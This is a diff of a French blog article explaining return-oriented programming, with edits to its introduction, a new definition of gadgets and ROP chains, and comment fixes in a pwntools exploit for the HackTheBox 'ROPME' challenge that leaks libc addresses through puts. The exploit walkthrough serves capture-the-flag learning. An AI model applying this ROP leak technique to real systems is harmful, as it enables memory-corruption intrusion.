@@ -9,7 +9,7 @@ description: Article théorique et pratique sur le ROP
 3. [Qu'est ce que le ROP ?](#ROP)
 4. [Exploitation + Walkthrough ROPME - HackTheBox](#ropme)
 
-Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout les différentes sections
+Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout quelques notions essentielles à la bonne compréhension de la suite de cette article ! 😀
 
 <div id='Les_sections'/>
 # Les sections d'un binaire
@@ -37,7 +37,7 @@ char var[256] = "nuts";
 ```
 
 <div id='Les_protections'/>
-# Les protections
+# Les protections des exécutables
 
 - NX est une protection qui rend la pile Non eXécutable, cette technique empeche l'exécution d'un shellcode dans la stack.
 
@@ -56,7 +56,7 @@ char var[256] = "nuts";
 <div id='ROP'/>
 # Qu'est ce que le ROP ?
 
-
+Le ROP (Return-oriented programming) est une technique d'exploitation reposant sur la recherche de blocs d'instructions à l'intérieur du binaire. Ces instructions terminent généralement par un ret, un call ou un jmp, c'est ce qu'on appel un **gadget**. Nous allons pouvoir chainer ces gadgets afin d'exécuter une suite d'actions, appelé **ROP Chain**.
 
 <div id='ropme'/>
 # Exploitation + Walkthrough ROPME - HackTheBox
@@ -71,7 +71,7 @@ p = remote(HOST, PORT)
 elf = ELF('./ropme')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-padding = b'A' * 72 # offset to overwrite EBP
+padding = b'A' * 72 # offset to overwrite RBP
 gadget = 0x4006d3 # pop rdi ; ret
 puts_plt = elf.plt['puts'] # 0x4004e0 (PLT in GEF)
 puts_got = elf.got['puts'] # 0x601018 (GOT in GEF)
@@ -80,7 +80,7 @@ addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)
 p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld
 
 pld = b''
-pld += padding # buffer + overwrite EBP (8 octets)
+pld += padding # buffer + overwrite RBP (8 octets)
 pld += p64(gadget) # 1 argument (pop rdi ; ret)
 pld += p64(puts_got) # to save addr puts of GOT in rdi register
 pld += p64(puts_plt) # to print puts GOT
